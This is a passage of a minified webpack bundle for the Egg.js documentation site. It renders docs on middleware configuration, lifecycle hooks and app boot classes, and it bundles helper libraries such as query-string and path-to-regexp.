\u5982\u679c\u4f60\u53ea\u60f3\u9488\u5bf9\u5355\u4e2a\u8def\u7531\u751f\u6548\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728 ",r.a.createElement("code",null,"app/router.js")," \u4e2d\u5b9e\u4f8b\u5316\u548c\u6302\u8f7d\uff0c\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  const gzip = app.middleware.gzip({ threshold: 1024 });\n  app.router.get('/needgzip', gzip, app.controller.handler);\n};",lang:"js"}),r.a.createElement("h2",{id:"\u6846\u67b6\u9ed8\u8ba4\u4e2d\u95f4\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u6846\u67b6\u9ed8\u8ba4\u4e2d\u95f4\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6846\u67b6\u9ed8\u8ba4\u4e2d\u95f4\u4ef6"),r.a.createElement("p",null,"\u9664\u4e86\u5e94\u7528\u5c42\u52a0\u8f7d\u4e2d\u95f4\u4ef6\u4e4b\u5916\uff0c\u6846\u67b6\u81ea\u8eab\u548c\u5176\u4ed6\u7684\u63d2\u4ef6\u4e5f\u4f1a\u52a0\u8f7d\u8bb8\u591a\u4e2d\u95f4\u4ef6\u3002\u6240\u6709\u7684\u8fd9\u4e9b\u81ea\u5e26\u4e2d\u95f4\u4ef6\u7684\u914d\u7f6e\u9879\u90fd\u901a\u8fc7\u5728\u914d\u7f6e\u4e2d\u4fee\u6539\u4e2d\u95f4\u4ef6\u540c\u540d\u914d\u7f6e\u9879\u8fdb\u884c\u4fee\u6539\uff0c\u4f8b\u5982",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/tree/master/app/middleware"},"\u6846\u67b6\u81ea\u5e26\u7684\u4e2d\u95f4\u4ef6"),"\u4e2d\u6709\u4e00\u4e2a bodyParser \u4e2d\u95f4\u4ef6\uff08\u6846\u67b6\u7684\u52a0\u8f7d\u5668\u4f1a\u5c06\u6587\u4ef6\u540d\u4e2d\u7684\u5404\u79cd\u5206\u9694\u7b26\u90fd\u4fee\u6539\u6210\u9a7c\u5cf0\u5f62\u5f0f\u7684\u53d8\u91cf\u540d\uff09\uff0c\u6211\u4eec\u60f3\u8981\u4fee\u6539 bodyParser \u7684\u914d\u7f6e\uff0c\u53ea\u9700\u8981\u5728 ",r.a.createElement("code",null,"config/config.default.js")," \u4e2d\u7f16\u5199"),r.a.createElement(o["a"],{code:"module.exports = {\n  bodyParser: {\n    jsonLimit: '10mb',\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u6846\u67b6\u548c\u63d2\u4ef6\u52a0\u8f7d\u7684\u4e2d\u95f4\u4ef6\u4f1a\u5728\u5e94\u7528\u5c42\u914d\u7f6e\u7684\u4e2d\u95f4\u4ef6\u4e4b\u524d\uff0c\u6846\u67b6\u9ed8\u8ba4\u4e2d\u95f4\u4ef6\u4e0d\u80fd\u88ab\u5e94\u7528\u5c42\u4e2d\u95f4\u4ef6\u8986\u76d6\uff0c\u5982\u679c\u5e94\u7528\u5c42\u6709\u81ea\u5b9a\u4e49\u540c\u540d\u4e2d\u95f4\u4ef6\uff0c\u5728\u542f\u52a8\u65f6\u4f1a\u62a5\u9519\u3002")),r.a.createElement("h2",{id:"\u4f7f\u7528-koa-\u7684\u4e2d\u95f4\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-koa-\u7684\u4e2d\u95f4\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 Koa \u7684\u4e2d\u95f4\u4ef6"),r.a.createElement("p",null,"\u5728\u6846\u67b6\u91cc\u9762\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u7684\u5f15\u5165 Koa \u4e2d\u95f4\u4ef6\u751f\u6001\u3002"),r.a.createElement("p",null,"\u4ee5 ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/compress"},"koa-compress")," \u4e3a\u4f8b\uff0c\u5728 Koa \u4e2d\u4f7f\u7528\u65f6\uff1a"),r.a.createElement(o["a"],{code:"const koa = require('koa');\nconst compress = require('koa-compress');\n\nconst app = koa();\n\nconst options = { threshold: 2048 };\napp.use(compress(options));",lang:"js"}),r.a.createElement("p",null,"\u6211\u4eec\u6309\u7167\u6846\u67b6\u7684\u89c4\u8303\u6765\u5728\u5e94\u7528\u4e2d\u52a0\u8f7d\u8fd9\u4e2a Koa \u7684\u4e2d\u95f4\u4ef6\uff1a"),r.a.createElement(o["a"],{code:"// app/middleware/compress.js\n// koa-compress \u66b4\u9732\u7684\u63a5\u53e3(`(options) => middleware`)\u548c\u6846\u67b6\u5bf9\u4e2d\u95f4\u4ef6\u8981\u6c42\u4e00\u81f4\nmodule.exports = require('koa-compress');",lang:"js"}),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  middleware: ['compress'],\n  compress: {\n    threshold: 2048,\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u4f7f\u7528\u5230\u7684 Koa \u4e2d\u95f4\u4ef6\u4e0d\u7b26\u5408\u5165\u53c2\u89c4\u8303\uff0c\u5219\u53ef\u4ee5\u81ea\u884c\u5904\u7406\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  webpack: {\n    compiler: {},\n    others: {},\n  },\n};\n\n// app/middleware/webpack.js\nconst webpackMiddleware = require('some-koa-middleware');\n\nmodule.exports = (options, app) => {\n  return webpackMiddleware(options.compiler, options.others);\n};",lang:"js"}),r.a.createElement("h2",{id:"\u901a\u7528\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u901a\u7528\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u901a\u7528\u914d\u7f6e"),r.a.createElement("p",null,"\u65e0\u8bba\u662f\u5e94\u7528\u5c42\u52a0\u8f7d\u7684\u4e2d\u95f4\u4ef6\u8fd8\u662f\u6846\u67b6\u81ea\u5e26\u4e2d\u95f4\u4ef6\uff0c\u90fd\u652f\u6301\u51e0\u4e2a\u901a\u7528\u7684\u914d\u7f6e\u9879\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"enable\uff1a\u63a7\u5236\u4e2d\u95f4\u4ef6\u662f\u5426\u5f00\u542f\u3002"),r.a.createElement("li",null,"match\uff1a\u8bbe\u7f6e\u53ea\u6709\u7b26\u5408\u67d0\u4e9b\u89c4\u5219\u7684\u8bf7\u6c42\u624d\u4f1a\u7ecf\u8fc7\u8fd9\u4e2a\u4e2d\u95f4\u4ef6\u3002"),r.a.createElement("li",null,"ignore\uff1a\u8bbe\u7f6e\u7b26\u5408\u67d0\u4e9b\u89c4\u5219\u7684\u8bf7\u6c42\u4e0d\u7ecf\u8fc7\u8fd9\u4e2a\u4e2d\u95f4\u4ef6\u3002")),r.a.createElement("h3",{id:"enable"},r.a.createElement(l["AnchorLink"],{to:"#enable","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"enable"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u7684\u5e94\u7528\u5e76\u4e0d\u9700\u8981\u9ed8\u8ba4\u7684 bodyParser \u4e2d\u95f4\u4ef6\u6765\u8fdb\u884c\u8bf7\u6c42\u4f53\u7684\u89e3\u6790\uff0c\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e enable \u4e3a false \u6765\u5173\u95ed\u5b83"),r.a.createElement(o["a"],{code:"module.exports = {\n  bodyParser: {\n    enable: false,\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"match-\u548c-ignore"},r.a.createElement(l["AnchorLink"],{to:"#match-\u548c-ignore","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"match \u548c ignore"),r.a.createElement("p",null,"match \u548c ignore \u652f\u6301\u7684\u53c2\u6570\u90fd\u4e00\u6837\uff0c\u53ea\u662f\u4f5c\u7528\u5b8c\u5168\u76f8\u53cd\uff0cmatch \u548c ignore \u4e0d\u5141\u8bb8\u540c\u65f6\u914d\u7f6e\u3002"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u60f3\u8ba9 gzip \u53ea\u9488\u5bf9 ",r.a.createElement("code",null,"/static")," \u524d\u7f00\u5f00\u5934\u7684 url \u8bf7\u6c42\u5f00\u542f\uff0c\u6211\u4eec\u53ef\u4ee5\u914d\u7f6e match \u9009\u9879"),r.a.createElement(o["a"],{code:"module.exports = {\n  gzip: {\n    match: '/static',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"match \u548c ignore \u652f\u6301\u591a\u79cd\u7c7b\u578b\u7684\u914d\u7f6e\u65b9\u5f0f"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u5b57\u7b26\u4e32\uff1a\u5f53\u53c2\u6570\u4e3a\u5b57\u7b26\u4e32\u7c7b\u578b\u65f6\uff0c\u914d\u7f6e\u7684\u662f\u4e00\u4e2a url \u7684\u8def\u5f84\u524d\u7f00\uff0c\u6240\u6709\u4ee5\u914d\u7f6e\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u524d\u7f00\u7684 url \u90fd\u4f1a\u5339\u914d\u4e0a\u3002 \u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5b57\u7b26\u4e32\u6570\u7ec4\u3002"),r.a.createElement("li",null,"\u6b63\u5219\uff1a\u5f53\u53c2\u6570\u4e3a\u6b63\u5219\u65f6\uff0c\u76f4\u63a5\u5339\u914d\u6ee1\u8db3\u6b63\u5219\u9a8c\u8bc1\u7684 url \u7684\u8def\u5f84\u3002"),r.a.createElement("li",null,"\u51fd\u6570\uff1a\u5f53\u53c2\u6570\u4e3a\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u4f1a\u5c06\u8bf7\u6c42\u4e0a\u4e0b\u6587\u4f20\u9012\u7ed9\u8fd9\u4e2a\u51fd\u6570\uff0c\u6700\u7ec8\u53d6\u51fd\u6570\u8fd4\u56de\u7684\u7ed3\u679c\uff08true/false\uff09\u6765\u5224\u65ad\u662f\u5426\u5339\u914d\u3002")),r.a.createElement(o["a"],{code:"module.exports = {\n  gzip: {\n    match(ctx) {\n      // \u53ea\u6709 ios \u8bbe\u5907\u624d\u5f00\u542f\n      const reg = /iphone|ipad|ipod/i;\n      return reg.test(ctx.get('user-agent'));\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u6709\u5173\u66f4\u591a\u7684 match \u548c ignore \u914d\u7f6e\u60c5\u51b5\uff0c\u8be6\u89c1",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-path-matching"},"egg-path-matching"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"/Edg":function(e,t){function n(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}e.exports=n,e.exports.__esModule=!0,e.exports["default"]=e.exports},"/Xeo":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"We've simplified the functions of our lifecycle for your convenience to control when to load application or plugins. Generally speaking, the lifecycle events can be divided into two forms:"),r.a.createElement("ol",null,r.a.createElement("li",null,"Function (already deprecated, just for compatibility)."),r.a.createElement("li",null,"Class Method (recommanded).")),r.a.createElement("h2",{id:"replacer-for-beforestart"},r.a.createElement(l["AnchorLink"],{to:"#replacer-for-beforestart","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Replacer for ",r.a.createElement("code",null,"beforeStart")),r.a.createElement("p",null,"We usually handle ",r.a.createElement("code",null,"beforeStart")," through ",r.a.createElement("code",null,"module.export")," with the input parameter ",r.a.createElement("code",null,"app")," in the app.js. Take this as an example below:"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  app.beforeStart(async () => {\n    // Here's where your codes were before\n  });\n};",lang:"js"}),r.a.createElement("p",null,"Now we've got some changes after upgration: We can use methods in a class in ",r.a.createElement("code",null,"app.js"),". For application, we should write in the ",r.a.createElement("code",null,"WillReady"),", for plugins, ",r.a.createElement("code",null,"didLoad")," is our choice. They look like below:"),r.a.createElement(o["a"],{code:"// app.js or agent.js:\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  async didLoad() {\n    // Please put your codes of `app.beforeStart` here for your plugin\n  }\n\n  async willReady() {\n    // Please put your codes of `app.beforeStart` here for your application\n  }\n}\n\nmodule.exports = AppBootHook;",lang:"js"}),r.a.createElement("h2",{id:"replacer-for-ready"},r.a.createElement(l["AnchorLink"],{to:"#replacer-for-ready","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Replacer for ",r.a.createElement("code",null,"ready")),r.a.createElement("p",null,"We used to process our logic in ",r.a.createElement("code",null,"app.ready"),":"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  app.ready(async () => {\n    // Here's where your codes were before\n  });\n};",lang:"js"}),r.a.createElement("p",null,"Now ",r.a.createElement("code",null,"didReady")," takes the place of it:"),r.a.createElement(o["a"],{code:"// app.js or agent.js:\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  async didReady() {\n    // Please put your codes of `app.ready` here\n  }\n}\n\nmodule.exports = AppBootHook;",lang:"js"}),r.a.createElement("h2",{id:"replacer-for-beforeclose"},r.a.createElement(l["AnchorLink"],{to:"#replacer-for-beforeclose","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Replacer for ",r.a.createElement("code",null,"beforeClose")),r.a.createElement("p",null,"We used to handle ",r.a.createElement("code",null,"app.beforeClose")," like this following:"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  app.beforeClose(async () => {\n    // Here's where your codes were before\n  });\n};",lang:"js"}),r.a.createElement("p",null,"Now we can use ",r.a.createElement("code",null,"beforeClose")," instead of it:"),r.a.createElement(o["a"],{code:"// app.js or agent.js:\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  async beforeClose() {\n    // Please put your codes of `app.beforeClose` here\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"others"},r.a.createElement(l["AnchorLink"],{to:"#others","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Others"),r.a.createElement("p",null,"In order to let you pick up quickly to replace your old functions, this torturial only tells you how to replace item by item. So if you want to know more about the whole principle of ",r.a.createElement("code",null,"Loader"),", as well as all the functions of Egg's lifecycle, Please refer to ",r.a.createElement(l["Link"],{to:"./loader"},"Loader")," and ",r.a.createElement(l["Link"],{to:"../basics/app-start"},"Application Startup Configuration"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"/bXB":function(e,t,n){var a,r,l=n("A0UU"),o=n("R+Ix"),i=l.process,c=i&&i.versions,s=c&&c.v8;s?(a=s.split("."),r=a[0]+a[1]):o&&(a=o.match(/Edge\/(\d+)/),(!a||a[1]>=74)&&(a=o.match(/Chrome\/(\d+)/),a&&(r=a[1]))),e.exports=r&&+r},"/cIH":function(e,t,n){"use strict";var a=n("/kpV")["default"],r=n("KtsK")["default"],l=n("Rlpu")["default"],o=n("VFN8"),i=n("jXzy"),c=n("CcMK"),s=n("BtsT"),u=function(e){return null===e||void 0===e};function d(e){switch(e.arrayFormat){case"index":return function(t){return function(n,a){var r=n.length;return void 0===a||e.skipNull&&null===a||e.skipEmptyString&&""===a?n:[].concat(l(n),null===a?[[h(t,e),"[",r,"]"].join("")]:[[h(t,e),"[",h(r,e),"]=",h(a,e)].join("")])}};case"bracket":return function(t){return function(n,a){return void 0===a||e.skipNull&&null===a||e.skipEmptyString&&""===a?n:[].concat(l(n),null===a?[[h(t,e),"[]"].join("")]:[[h(t,e),"[]=",h(a,e)].join("")])}};case"comma":case"separator":return function(t){return function(n,a){return null===a||void 0===a||0===a.length?n:0===n.length?[[h(t,e),"=",h(a,e)].join("")]:[[n,h(a,e)].join(e.arrayFormatSeparator)]}};default:return function(t){return function(n,a){return void 0===a||e.skipNull&&null===a||e.skipEmptyString&&""===a?n:[].concat(l(n),null===a?[h(t,e)]:[[h(t,e),"=",h(a,e)].join("")])}}}}function m(e){var t;switch(e.arrayFormat){case"index":return function(e,n,a){t=/\[(\d*)\]$/.exec(e),e=e.replace(/\[\d*\]$/,""),t?(void 0===a[e]&&(a[e]={}),a[e][t[1]]=n):a[e]=n};case"bracket":return function(e,n,a){t=/(\[\])$/.exec(e),e=e.replace(/\[\]$/,""),t?void 0!==a[e]?a[e]=[].concat(a[e],n):a[e]=[n]:a[e]=n};case"comma":case"separator":return function(t,n,a){var r="string"===typeof n&&n.includes(e.arrayFormatSeparator),l="string"===typeof n&&!r&&g(n,e).includes(e.arrayFormatSeparator);n=l?g(n,e):n;var o=r||l?n.split(e.arrayFormatSeparator).map((function(t){return g(t,e)})):null===n?n:g(n,e);a[t]=o};default:return function(e,t,n){void 0!==n[e]?n[e]=[].concat(n[e],t):n[e]=t}}}function p(e){if("string"!==typeof e||1!==e.length)throw new TypeError("arrayFormatSeparator must be single character string")}function h(e,t){return t.encode?t.strict?o(e):encodeURIComponent(e):e}function g(e,t){return t.decode?i(e):e}function f(e){return Array.isArray(e)?e.sort():"object"===typeof e?f(Object.keys(e)).sort((function(e,t){return Number(e)-Number(t)})).map((function(t){return e[t]})):e}function E(e){var t=e.indexOf("#");return-1!==t&&(e=e.slice(0,t)),e}function b(e){var t="",n=e.indexOf("#");return-1!==n&&(t=e.slice(n)),t}function v(e){e=E(e);var t=e.indexOf("?");return-1===t?"":e.slice(t+1)}function y(e,t){return t.parseNumbers&&!Number.isNaN(Number(e))&&"string"===typeof e&&""!==e.trim()?e=Number(e):!t.parseBooleans||null===e||"true"!==e.toLowerCase()&&"false"!==e.toLowerCase()||(e="true"===e.toLowerCase()),e}function k(e,t){t=Object.assign({decode:!0,sort:!0,arrayFormat:"none",arrayFormatSeparator:",",parseNumbers:!1,parseBooleans:!1},t),p(t.arrayFormatSeparator);var n=m(t),l=Object.create(null);if("string"!==typeof e)return l;if(e=e.trim().replace(/^[?#&]/,""),!e)return l;var o,i=r(e.split("&"));try{for(i.s();!(o=i.n()).done;){var s=o.value;if(""!==s){var u=c(t.decode?s.replace(/\+/g," "):s,"="),d=a(u,2),h=d[0],E=d[1];E=void 0===E?null:["comma","separator"].includes(t.arrayFormat)?E:g(E,t),n(g(h,t),E,l)}}}catch(C){i.e(C)}finally{i.f()}for(var b=0,v=Object.keys(l);b<v.length;b++){var k=v[b],w=l[k];if("object"===typeof w&&null!==w)for(var x=0,j=Object.keys(w);x<j.length;x++){var S=j[x];w[S]=y(w[S],t)}else l[k]=y(w,t)}return!1===t.sort?l:(!0===t.sort?Object.keys(l).sort():Object.keys(l).sort(t.sort)).reduce((function(e,t){var n=l[t];return Boolean(n)&&"object"===typeof n&&!Array.isArray(n)?e[t]=f(n):e[t]=n,e}),Object.create(null))}t.extract=v,t.parse=k,t.stringify=function(e,t){if(!e)return"";t=Object.assign({encode:!0,strict:!0,arrayFormat:"none",arrayFormatSeparator:","},t),p(t.arrayFormatSeparator);for(var n=function(n){return t.skipNull&&u(e[n])||t.skipEmptyString&&""===e[n]},a=d(t),r={},l=0,o=Object.keys(e);l<o.length;l++){var i=o[l];n(i)||(r[i]=e[i])}var c=Object.keys(r);return!1!==t.sort&&c.sort(t.sort),c.map((function(n){var r=e[n];return void 0===r?"":null===r?h(n,t):Array.isArray(r)?r.reduce(a(n),[]).join("&"):h(n,t)+"="+h(r,t)})).filter((function(e){return e.length>0})).join("&")},t.parseUrl=function(e,t){t=Object.assign({decode:!0},t);var n=c(e,"#"),r=a(n,2),l=r[0],o=r[1];return Object.assign({url:l.split("?")[0]||"",query:k(v(e),t)},t&&t.parseFragmentIdentifier&&o?{fragmentIdentifier:g(o,t)}:{})},t.stringifyUrl=function(e,n){n=Object.assign({encode:!0,strict:!0},n);var a=E(e.url).split("?")[0]||"",r=t.extract(e.url),l=t.parse(r,{sort:!1}),o=Object.assign(l,e.query),i=t.stringify(o,n);i&&(i="?".concat(i));var c=b(e.url);return e.fragmentIdentifier&&(c="#".concat(h(e.fragmentIdentifier,n))),"".concat(a).concat(i).concat(c)},t.pick=function(e,n,a){a=Object.assign({parseFragmentIdentifier:!0},a);var r=t.parseUrl(e,a),l=r.url,o=r.query,i=r.fragmentIdentifier;return t.stringifyUrl({url:l,query:s(o,n),fragmentIdentifier:i},a)},t.exclude=function(e,n,a){var r=Array.isArray(n)?function(e){return!n.includes(e)}:function(e,t){return!n(e,t)};return t.pick(e,r,a)}},"/iuR":function(e,t,n){"use strict";var a=n("Jdqy");function r(){}function l(){}l.resetWarningCache=r,e.exports=function(){function e(e,t,n,r,l,o){if(o!==a){var i=new Error("Calling PropTypes validators directly is not supported by the `prop-types` package. Use PropTypes.checkPropTypes() to call them. Read more at http://fb.me/use-check-prop-types");throw i.name="Invariant Violation",i}}function t(){return e}e.isRequired=e;var n={array:e,bigint:e,bool:e,func:e,number:e,object:e,string:e,symbol:e,any:e,arrayOf:t,element:e,elementType:e,instanceOf:t,node:e,objectOf:t,oneOf:t,oneOfType:t,shape:t,exact:t,checkPropTypes:l,resetWarningCache:r};return n.PropTypes=n,n}},"/jHK":function(e,t,n){var a=n("RdBk");e.exports=b,e.exports.parse=l,e.exports.compile=o,e.exports.tokensToFunction=s,e.exports.tokensToRegExp=E;var r=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function l(e,t){var n,a=[],l=0,o=0,i="",c=t&&t.delimiter||"/";while(null!=(n=r.exec(e))){var s=n[0],m=n[1],p=n.index;if(i+=e.slice(o,p),o=p+s.length,m)i+=m[1];else{var h=e[o],g=n[2],f=n[3],E=n[4],b=n[5],v=n[6],y=n[7];i&&(a.push(i),i="");var k=null!=g&&null!=h&&h!==g,w="+"===v||"*"===v,x="?"===v||"*"===v,j=n[2]||c,S=E||b;a.push({name:f||l++,prefix:g||"",delimiter:j,optional:x,repeat:w,partial:k,asterisk:!!y,pattern:S?d(S):y?".*":"[^"+u(j)+"]+?"})}}return o<e.length&&(i+=e.substr(o)),i&&a.push(i),a}function o(e,t){return s(l(e,t),t)}function i(e){return encodeURI(e).replace(/[\/?#]/g,(function(e){return"%"+e.charCodeAt(0).toString(16).toUpperCase()}))}function c(e){return encodeURI(e).replace(/[?#]/g,(function(e){return"%"+e.charCodeAt(0).toString(16).toUpperCase()}))}function s(e,t){for(var n=new Array(e.length),r=0;r<e.length;r++)"object"===typeof e[r]&&(n[r]=new RegExp("^(?:"+e[r].pattern+")$",p(t)));return function(t,r){for(var l="",o=t||{},s=r||{},u=s.pretty?i:encodeURIComponent,d=0;d<e.length;d++){var m=e[d];if("string"!==typeof m){var p,h=o[m.name];if(null==h){if(m.optional){m.partial&&(l+=m.prefix);continue}throw new TypeError('Expected "'+m.name+'" to be defined')}if(a(h)){if(!m.repeat)throw new TypeError('Expected "'+m.name+'" to not repeat, but received `'+JSON.stringify(h)+"`");if(0===h.length){if(m.optional)continue;throw new TypeError('Expected "'+m.name+'" to not be empty')}for(var g=0;g<h.length;g++){if(p=u(h[g]),!n[d].test(p))throw new TypeError('Expected all "'+m.name+'" to match "'+m.pattern+'", but received `'+JSON.stringify(p)+"`");l+=(0===g?m.prefix:m.delimiter)+p}}else{if(p=m.asterisk?c(h):u(h),!n[d].test(p))throw new TypeError('Expected "'+m.name+'" to match "'+m.pattern+'", but received "'+p+'"');l+=m.prefix+p}}else l+=m}return l}}function u(e){return e.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function d(e){return e.replace(/([=!:$\/()])/g,"\\$1")}function m(e,t){return e.keys=t,e}function p(e){return e&&e.sensitive?"":"i"}function h(e,t){var n=e.source.match(/\((?!\?)/g);if(n)for(var a=0;a<n.length;a++)t.push({name:a,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return m(e,t)}function g(e,t,n){for(var a=[],r=0;r<e.length;r++)a.push(b(e[r],t,n).source);var l=new RegExp("(?:"+a.join("|")+")",p(n));return m(l,t)}function f(e,t,n){return E(l(e,n),t,n)}function E(e,t,n){a(t)||(n=t||n,t=[]),n=n||{};for(var r=n.strict,l=!1!==n.end,o="",i=0;i<e.length;i++){var c=e[i];if("string"===typeof c)o+=u(c);else{var s=u(c.prefix),d="(?:"+c.pattern+")";t.push(c),c.repeat&&(d+="(?:"+s+d+")*"),d=c.optional?c.partial?s+"("+d+")?":"(?:"+s+"("+d+"))?":s+"("+d+")",o+=d}}var h=u(n.delimiter||"/"),g=o.slice(-h.length)===h;return r||(o=(g?o.slice(0,-h.length):o)+"(?:"+h+"(?=$))?"),o+=l?"$":r&&g?"":"(?="+h+"|$)",m(new RegExp("^"+o,p(n)),t)}function b(e,t,n){return a(t)||(n=t||n,t=[]),n=n||{},e instanceof RegExp?h(e,t):a(e)?g(e,t,n):f(e,t,n)}},"/kpV":function(e,t,n){var a=n("viSH"),r=n("6xEZ"),l=n("BHsG"),o=n("Tgud");function i(e,t){return a(e)||r(e,t)||l(e,t)||o()}e.exports=i,e.exports.__esModule=!0,e.exports["default"]=e.exports},"/qa7":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"When the application starts up, we often need to set up some initialization logic. The application bootstraps with those specific configurations. It is in a healthy state and be able to take external service requests after those configurations successfully applied. Otherwise, it failed."),r.a.createElement("p",null,"The framework provides a unified entry file (",r.a.createElement("code",null,"app.js"),") for boot process customization. This file need returns a Boot class. We can define the initialization process in the startup application by defining the lifecycle method in the Boot class."),r.a.createElement("p",null,"The framework has provided you several functions to handle during the whole ",r.a.createElement(l["AnchorLink"],{to:"../advanced/loader#life-cycles"},"life cycle"),":"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"configWillLoad"),": All the config files are ready to load, so this is the LAST chance to modify them."),r.a.createElement("li",null,r.a.createElement("code",null,"configDidLoad"),": When all the config files have been loaded."),r.a.createElement("li",null,r.a.createElement("code",null,"didLoad"),": When all the files have been loaded."),r.a.createElement("li",null,r.a.createElement("code",null,"willReady"),": When all the plug-ins are ready."),r.a.createElement("li",null,r.a.createElement("code",null,"didReady"),": When all the workers are ready."),r.a.createElement("li",null,r.a.createElement("code",null,"serverDidReady"),": When the server is ready."),r.a.createElement("li",null,r.a.createElement("code",null,"beforeClose"),": Before the application is closed.")),r.a.createElement("p",null,"We can defined Boot class in ",r.a.createElement("code",null,"app.js"),". Below we take a few examples of lifecycle functions commonly used in application development:"),r.a.createElement(o["a"],{code:"// app.js\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  configWillLoad() {\n    // The config file has been read and merged, but it has not yet taken effect\n    // This is the last time the application layer modifies the configuration\n    // Note: This function only supports synchronous calls.\n\n    // For example: the password in the parameter is encrypted, decrypt it here\n    this.app.config.mysql.password = decrypt(this.app.config.mysql.password);\n    // For example: insert a middleware into the framework's coreMiddleware\n    const statusIdx = this.app.config.coreMiddleware.indexOf('status');\n    this.app.config.coreMiddleware.splice(statusIdx + 1, 0, 'limit');\n  }\n\n  async didLoad() {\n    // All configurations have been loaded\n    // Can be used to load the application custom file, start a custom service\n\n    // Example: Creating a custom app example\n    this.app.queue = new Queue(this.app.config.queue);\n    await this.app.queue.init();\n\n    // For example: load a custom directory\n    this.app.loader.loadToContext(path.join(__dirname, 'app/tasks'), 'tasks', {\n      fieldClass: 'tasksClasses',\n    });\n  }\n\n  async willReady() {\n    // All plugins have been started, but the application is not yet ready\n    // Can do some data initialization and other operations\n    // Application will start after these operations executed succcessfully\n\n    // For example: loading data from the database into the in-memory cache\n    this.app.cacheData = await this.app.model.query(QUERY_CACHE_SQL);\n  }\n\n  async didReady() {\n    // Application already ready\n\n    const ctx = await this.app.createAnonymousContext();\n    await ctx.service.Biz.request();\n  }\n\n  async serverDidReady() {\n    // http / https server has started and begins accepting external requests\n    // At this point you can get an instance of server from app.server\n\n    this.app.server.on('timeout', (socket) => {\n      // handle socket timeout\n    });\n  }\n}\n\nmodule.exports = AppBootHook;",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: It is not recommended to do long-time operations in the custom lifecycle function, because the framework has a startup timeout detection.")),r.a.createElement("p",null,'If your Egg\'s life-cycle functions are old, we suggest you upgrading to the "class-method" mode. For more you can refer to ',r.a.createElement(l["Link"],{to:"../advanced/loader-update"},"Upgrade your event functions in your lifecycle"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var 